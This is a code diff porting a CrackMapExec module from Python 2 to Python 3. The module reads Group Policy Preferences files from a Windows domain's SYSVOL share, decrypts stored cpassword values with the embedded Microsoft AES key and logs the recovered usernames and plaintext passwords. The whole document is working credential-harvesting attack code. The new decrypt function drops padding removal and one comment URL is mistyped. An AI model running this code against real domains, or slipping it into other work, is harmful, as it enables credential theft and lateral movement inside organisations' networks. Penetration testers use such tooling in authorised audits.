@@ -2,7 +2,7 @@ import xml.etree.ElementTree as ET
 from Cryptodome.Cipher import AES
 from base64 import b64decode
 from binascii import unhexlify
-from StringIO import StringIO
+from io import BytesIO
 
 class CMEModule:
     '''
@@ -33,7 +33,7 @@ class CMEModule:
                 for path in paths:
                     context.log.info('Found {}'.format(path))
 
-                    buf = StringIO()
+                    buf = BytesIO()
                     connection.conn.getFile('SYSVOL', path, buf.write)
                     xml = ET.fromstring(buf.getvalue())
 
@@ -58,17 +58,17 @@ class CMEModule:
                     for attr in xml_section:
                         props = attr.attrib
 
-                        if props.has_key('cpassword'):
+                        if 'cpassword' in props:
 
                             for user_tag in ['userName', 'accountName', 'runAs', 'username']:
-                                if props.has_key(user_tag):
+                                if user_tag in props:
                                     username = props[user_tag]
 
                             password = self.decrypt_cpassword(props['cpassword'])
 
                             context.log.success('Found credentials in {}'.format(path))
                             context.log.highlight('Password: {}'.format(password))
-                            for k,v in props.iteritems():
+                            for k,v in props.items():
                                 if k != 'cpassword':
                                     context.log.highlight('{}: {}'.format(k, v))
 
@@ -77,16 +77,12 @@ class CMEModule:
 
     def decrypt_cpassword(self, cpassword):
 
-        #Stolen from https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py
+        #Stolen from hhttps://gist.github.com/andreafortuna/4d32100ae03abead52e8f3f61ab70385
 
         # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
         key = unhexlify('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
-        try:
-            password = b64decode(cpassword)
-        except TypeError:
-            cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
-            password = b64decode(cpassword)
-
-        decypted = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)
-
-        return decypted[:-ord(decypted[-1])].decode('utf16')
+        cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
+        password = b64decode(cpassword)
+        IV = "\x00" * 16
+        decypted = AES.new(key, AES.MODE_CBC, IV.encode("utf8")).decrypt(password)
+        return decypted.decode()
